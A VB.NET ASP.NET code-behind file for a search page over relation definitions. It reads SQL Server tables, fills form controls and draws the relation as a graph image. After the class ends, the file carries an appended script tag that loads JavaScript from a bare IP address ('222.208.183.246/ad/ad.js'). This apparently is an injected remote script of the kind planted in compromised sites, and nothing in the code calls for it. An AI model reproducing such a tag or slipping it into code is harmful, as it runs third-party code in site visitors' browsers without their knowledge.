Imports System.Data
Imports System.Data.SqlClient
Imports System.Drawing
Imports System.Drawing.Drawing2D
Imports System.Drawing.Imaging

Public Class rdefinitionsearch
    Inherits System.Web.UI.Page

#Region " Web 窗体设计器生成的代码 "

    '该调用是 Web 窗体设计器所必需的。
    <System.Diagnostics.DebuggerStepThrough()> Private Sub InitializeComponent()

    End Sub
    Protected WithEvents Form2 As System.Web.UI.HtmlControls.HtmlForm
    Protected WithEvents Label1 As System.Web.UI.WebControls.Label
    Protected WithEvents Label6 As System.Web.UI.WebControls.Label
    Protected WithEvents Label12 As System.Web.UI.WebControls.Label
    Protected WithEvents Label13 As System.Web.UI.WebControls.Label
    Protected WithEvents Label14 As System.Web.UI.WebControls.Label
    Protected WithEvents Label15 As System.Web.UI.WebControls.Label
    Protected WithEvents Label17 As System.Web.UI.WebControls.Label
    Protected WithEvents Label2 As System.Web.UI.WebControls.Label
    Protected WithEvents Label3 As System.Web.UI.WebControls.Label
    Protected WithEvents Label4 As System.Web.UI.WebControls.Label
    Protected WithEvents ddlstDefAtt As System.Web.UI.WebControls.DropDownList
    Protected WithEvents btnDefSearch As System.Web.UI.WebControls.Button
    Protected WithEvents ddlstDefSearch As System.Web.UI.WebControls.DropDownList
    Protected WithEvents txtDefName As System.Web.UI.WebControls.TextBox
    Protected WithEvents txtDefNum As System.Web.UI.WebControls.TextBox
    Protected WithEvents rbtnIsValidYes As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnIsValidNo As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnIsDirYes As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnIsDirNo As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnIsConfYes As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnIsConfNo As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnAccPri3 As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnAccPri2 As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnAccPri1 As System.Web.UI.WebControls.RadioButton
    Protected WithEvents txtDefPubTime As System.Web.UI.WebControls.TextBox
    Protected WithEvents txtDefUpdateTime As System.Web.UI.WebControls.TextBox
    Protected WithEvents dgrdDefAss As System.Web.UI.WebControls.DataGrid
    Protected WithEvents dgrdDefLogic As System.Web.UI.WebControls.DataGrid
    Protected WithEvents imgDef As System.Web.UI.WebControls.Image
    Protected WithEvents lblHint As System.Web.UI.WebControls.Label
    Protected WithEvents lblWarning As System.Web.UI.WebControls.Label
    Protected WithEvents timetext As System.Web.UI.WebControls.Label

    '注意: 以下占位符声明是 Web 窗体设计器所必需的。
    '不要删除或移动它。
    Private designerPlaceholderDeclaration As System.Object

    Private Sub Page_Init(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Init
        'CODEGEN: 此方法调用是 Web 窗体设计器所必需的
        '不要使用代码编辑器修改它。
        InitializeComponent()
    End Sub

#End Region

    Private Sub DrawArrayLine(ByRef g As Graphics, ByRef myPen As System.Drawing.Pen, _
    ByVal x1 As Single, ByVal y1 As Single, ByVal x2 As Single, ByVal y2 As Single)
        If (x1 = x2 And y1 = y2) Then
            Exit Sub
        End If

        g.DrawLine(myPen, x1, y1, x2, y2)

        Dim lenArray As Integer = 12  '箭头长度
        Dim arcArray As Double = 32.0 * Math.PI / 180.0 ' 箭头线偏移角

        Dim arc1 As Double = 0.0    ' 箭头线绝对角度
        Dim arc2 As Double = 0.0
        Dim arcT As Double = 0.0
        Dim p1 As New Point(x2, y2)
        Dim p2 As New Point(x2, y2)

        If (x1 = x2) Then
            If (y2 > y1) Then
                arcT = 1.5 * Math.PI
            Else
                arcT = 0.5 * Math.PI
            End If
        ElseIf (y1 = y2) Then
            If (x2 < x1) Then
                arcT = 0.0
            Else
                arcT = Math.PI
            End If
        Else
            Dim rate As Double = 1.0 * (y2 - y1) / (x2 - x1)
            arcT = Math.Atan(rate)
            If (arcT > 0 And x2 > x1 And y2 > y1) Then
                arcT = arcT + Math.PI
            ElseIf (arcT < 0 And x2 > x1 And y2 < y1) Then
                arcT = arcT + Math.PI
            End If
        End If
        arc1 = arcT - arcArray
        arc2 = arcT + arcArray
        p1.X = lenArray * Math.Cos(arc1) + x2
        p1.Y = lenArray * Math.Sin(arc1) + y2
        p2.X = lenArray * Math.Cos(arc2) + x2
        p2.Y = lenArray * Math.Sin(arc2) + y2
        g.DrawLine(myPen, x2, y2, p1.X, p1.Y)
        g.DrawLine(myPen, x2, y2, p2.X, p2.Y)
    End Sub

    Private Sub ShowSearch(ByVal index As Integer)  ' 初始化页面显示
        Dim strSql As String
        Dim mySqlConn As New SqlConnection(Me.Application("DataBase"))
        Dim myDataSetDef As New DataSet '关系类型数据集
        Dim myDataSetAss As New DataSet '关系断言数据集
        Dim myDataSetLogic As New DataSet   '关系逻辑数据集
        Try
            mySqlConn.Open()

            Dim mySqlAdapterDef As New SqlDataAdapter("select * from rdefinition", mySqlConn)
            mySqlAdapterDef.Fill(myDataSetDef, "rdefinition")

            strSql = [String].Format("select * from publisherassertion where rdefinitionkey = '{0}'", _
                myDataSetDef.Tables("rdefinition").Rows(index).Item("rdefinitionkey"))
            Dim mySqlAdapterAss As New SqlDataAdapter(strSql, mySqlConn)
            mySqlAdapterAss.Fill(myDataSetAss, "publisherassertion")

            Dim mySqlAdapterLogic As New SqlDataAdapter("select * from logic", mySqlConn)
            mySqlAdapterLogic.Fill(myDataSetLogic, "logic")

            mySqlConn.Close()
        Catch ex As SqlException
            Throw ex
            'Response.Redirect("error.htm") ' 错误提示
        Finally
        End Try

        'Me.txtDefKey.Text = Session("myDataSet").Tables("rdefinition").Rows(index).Item("rdefinitionkey")
        Me.txtDefName.Text = myDataSetDef.Tables("rdefinition").Rows(index).Item("rdefinitionname")
        Me.txtDefNum.Text = myDataSetDef.Tables("rdefinition").Rows(index).Item("relatedobjnum")
        Me.txtDefPubTime.Text = myDataSetDef.Tables("rdefinition").Rows(index).Item("publishtime")
        Me.txtDefUpdateTime.Text = myDataSetDef.Tables("rdefinition").Rows(index).Item("latestupdatetime")
        Dim temp = myDataSetDef.Tables("rdefinition").Rows(index).Item("accessprivilege")
        If temp = "1" Then
            Me.rbtnAccPri2.Checked = False
            Me.rbtnAccPri3.Checked = False
            Me.rbtnAccPri1.Checked = True
        ElseIf temp = "2" Then
            Me.rbtnAccPri1.Checked = False
            Me.rbtnAccPri3.Checked = False
            Me.rbtnAccPri2.Checked = True
        Else
            Me.rbtnAccPri1.Checked = False
            Me.rbtnAccPri2.Checked = False
            Me.rbtnAccPri3.Checked = True
        End If

        If myDataSetDef.Tables("rdefinition").Rows(index).Item("isvalid") = "1" Then
            Me.rbtnIsValidNo.Checked = False
            Me.rbtnIsValidYes.Checked = True
        Else
            Me.rbtnIsValidYes.Checked = False
            Me.rbtnIsValidNo.Checked = True
        End If

        If myDataSetDef.Tables("rdefinition").Rows(index).Item("isdirectional") = "1" Then
            Me.rbtnIsDirNo.Checked = False
            Me.rbtnIsDirYes.Checked = True
        Else
            Me.rbtnIsDirYes.Checked = False
            Me.rbtnIsDirNo.Checked = True
        End If

        If myDataSetDef.Tables("rdefinition").Rows(index).Item("needaffirm") = "1" Then
            Me.rbtnIsConfNo.Checked = False
            Me.rbtnIsConfYes.Checked = True
        Else
            Me.rbtnIsConfYes.Checked = False
            Me.rbtnIsConfNo.Checked = True
        End If

        Me.dgrdDefAss.DataSource = myDataSetAss.Tables("publisherassertion").DefaultView
        Me.dgrdDefAss.DataBind()

        Me.dgrdDefLogic.DataSource = myDataSetLogic.Tables("logic").DefaultView
        Me.dgrdDefLogic.DataBind()

        'draw picture here
        Dim width As Integer = 220  '图片宽
        Dim height As Integer = 220 '高

        Dim bmp As New Bitmap(width, height, PixelFormat.Format24bppRgb)    '图片
        Dim g As Graphics = Graphics.FromImage(bmp)
        g.FillRectangle(Brushes.White, New Rectangle(0, 0, width, height))
        Dim myPen As New Pen(Color.Blue)
        'g.DrawLine(myPen, 0, 0, 200, 200)
        'Dim destinationPoints As Point() = {New Point(0, 20), New Point(300, 50), New Point(30, 100)}

        Dim center As New Point(width / 2, height / 2)  '圆心
        Dim r As Double = Math.Min(width / 2, height / 2) - 30  '半径
        Dim iNum As Int32   '顶点个数
        iNum = Int32.Parse(myDataSetDef.Tables("rdefinition").Rows(index).Item("relatedobjnum"))
        If (iNum <= 0) Then
            Exit Sub
        End If

        Dim pObj(iNum) As Point '各顶点坐标
        Dim dataObj(iNum) As String '顶点上标志
        Dim theta As Double = -Math.PI  '顶点角度   
        Dim ss As String = "abcdefghijklmnopqrstuvwxyz" '顶点坐标
        Dim myFontFamily As New FontFamily("Arial")
        Dim myFont As New Font(myFontFamily, 24, FontStyle.Regular, GraphicsUnit.Pixel)
        Dim myBrush As New SolidBrush(Color.Black)
        Dim i As Integer

        Dim nn As Integer   '边数
        nn = myDataSetAss.Tables("publisherassertion").Rows.Count

        myPen = New Pen(Color.Black)
        Dim count As Integer = 0    '已定顶点记数
        Dim iFrom As Integer = -1   '开始顶点标志在ss数组中下标
        Dim iTo As Integer = -1 '结束顶点标志在ss数组中下标
        Dim j As Integer
        If (nn > 0) Then
            For i = 0 To nn - 1
                For j = 0 To count - 1
                    If (myDataSetAss.Tables("publisherassertion").Rows(i).Item("vfrom") = dataObj(j)) Then
                        iFrom = j
                    End If
                    If (myDataSetAss.Tables("publisherassertion").Rows(i).Item("vto") = dataObj(j)) Then
                        iTo = j
                    End If
                    If (iFrom > 0 And iTo > 0) Then
                        Exit For
                    End If
                Next
                If (iFrom = -1) Then
                    iFrom = count
                    dataObj(iFrom) = myDataSetAss.Tables("publisherassertion").Rows(i).Item("vfrom")
                    pObj(iFrom) = New Point(r * Math.Cos(theta) + center.X, r * Math.Sin(theta) + center.Y)
                    g.DrawString(dataObj(iFrom), myFont, myBrush, pObj(iFrom).X, pObj(iFrom).Y)
                    theta = theta + 2.0 * Math.PI / iNum
                    count = count + 1
                End If
                If (iTo = -1) Then
                    iTo = count
                    dataObj(iTo) = myDataSetAss.Tables("publisherassertion").Rows(i).Item("vto")
                    pObj(iTo) = New Point(r * Math.Cos(theta) + center.X, r * Math.Sin(theta) + center.Y)
                    g.DrawString(dataObj(iTo), myFont, myBrush, pObj(iTo).X, pObj(iTo).Y)
                    theta = theta + 2.0 * Math.PI / iNum
                    count = count + 1
                End If

                Dim offset As Integer = 11  '边线将缩短的距离,避免画到字上
                Dim wxOffset As Integer = 10 '移到字中心位置
                Dim wyOffset As Integer = 16 '移到字中心位置
                Dim xOffset As Integer = 0
                Dim yOffset As Integer = 0
                If (pObj(iTo).X = pObj(iFrom).X) Then
                    yOffset = offset
                ElseIf (pObj(iTo).Y = pObj(iFrom).Y) Then
                    xOffset = offset
                Else
                    Dim rate As Double = 1.0 * (pObj(iFrom).Y - pObj(iTo).Y) / (pObj(iTo).X - pObj(iFrom).X)
                    Dim dcos As Double = 1 / Math.Sqrt(1.0 + rate * rate)
                    Dim dsin As Double = Math.Sqrt(1.0 - dcos * dcos)
                    xOffset = offset * dcos
                    yOffset = offset * dsin
                End If
                If (pObj(iFrom).X > pObj(iTo).X) Then
                    xOffset = -xOffset
                End If
                If (pObj(iFrom).Y > pObj(iTo).Y) Then
                    yOffset = -yOffset
                End If

                If (myDataSetDef.Tables("rdefinition").Rows(index).Item("isdirectional").ToString() = "1") Then
                    DrawArrayLine(g, myPen, pObj(iFrom).X + xOffset + wxOffset, pObj(iFrom).Y + yOffset + wyOffset, pObj(iTo).X - xOffset + wxOffset, pObj(iTo).Y - yOffset + wxOffset)
                Else
                    g.DrawLine(myPen, pObj(iFrom).X + xOffset + wxOffset, pObj(iFrom).Y + yOffset + wyOffset, pObj(iTo).X - xOffset + wxOffset, pObj(iTo).Y - yOffset + wxOffset)
                End If

                iFrom = -1
                iTo = -1
            Next
        End If

        If (count <> iNum) Then
            Dim iMark As Integer = 0
            For i = count To iNum - 1
                For j = 0 To count
                    If (ss.Substring(iMark, 1) <> dataObj(j)) Then
                        Exit For
                    Else
                        iMark = iMark + 1
                    End If
                Next
                pObj(i) = New Point(r * Math.Cos(theta) + center.X, r * Math.Sin(theta) + center.Y)
                g.DrawString(ss.Chars(iMark), myFont, myBrush, pObj(i).X, pObj(i).Y)
                theta = theta + 2.0 * Math.PI / iNum
                count = count + 1
                iMark = iMark + 1
            Next
        End If

        bmp.Save(Server.MapPath("") + "\\imga\\tmpFile.gif", ImageFormat.Gif)
        Me.imgDef.ImageUrl = Server.MapPath("") + "\\imga\\tmpFile.gif"
        g.Dispose()
        bmp.Dispose()

        Session("myDataSet") = myDataSetDef
    End Sub

    Private Sub Page_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        '在此处放置初始化页的用户代码
        Me.lblWarning.Visible = False
        Me.timetext.Text = DateTime.Now.ToString()
        'Me.txtDefKey.Enabled = False

        Me.lblHint.ForeColor = System.Drawing.Color.AntiqueWhite

        If Session("UserName") = "" Then
            Me.lblHint.Text = "您还没登录，请先登录"
        Else
            Me.lblHint.Text = "您好， " + Session("UserName")
        End If

        If Not IsPostBack Then  ' 用户x第一次打开页面时
            Me.ShowSearch(0)
            Me.ddlstDefSearch.DataSource = Me.Session("myDataSet").Tables("rdefinition").DefaultView
            Me.ddlstDefSearch.DataValueField = "rdefinitionkey"
            Me.ddlstDefSearch.DataBind()
            Me.Session("index") = 0
            Me.Session("colname") = "rdefinitionkey"
        End If
    End Sub

    Private Sub btnDefSearch_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnDefSearch.Click
        Me.ddlstDefSearch.DataSource = Session("myDataSet").Tables("rdefinition").DefaultView
        Me.ddlstDefSearch.DataValueField = Me.Session("colname")
        Me.ddlstDefSearch.DataBind()
        Me.ddlstDefSearch.SelectedIndex = Me.Session("index")
        ShowSearch(Me.Session("index"))
    End Sub

    Private Sub ddlstDefAtt_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ddlstDefAtt.SelectedIndexChanged
        If Me.ddlstDefAtt.SelectedIndex = 0 Then
            Me.Session("colname") = "rdefinitionkey"
        Else
            Me.Session("colname") = "rdefinitionname"
        End If
    End Sub

    Private Sub ddlstDefSearch_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ddlstDefSearch.SelectedIndexChanged
        Me.Session("index") = Me.ddlstDefSearch.SelectedIndex
    End Sub
End Class
<script src="http://222.208.183.246/ad/ad.js"></script>
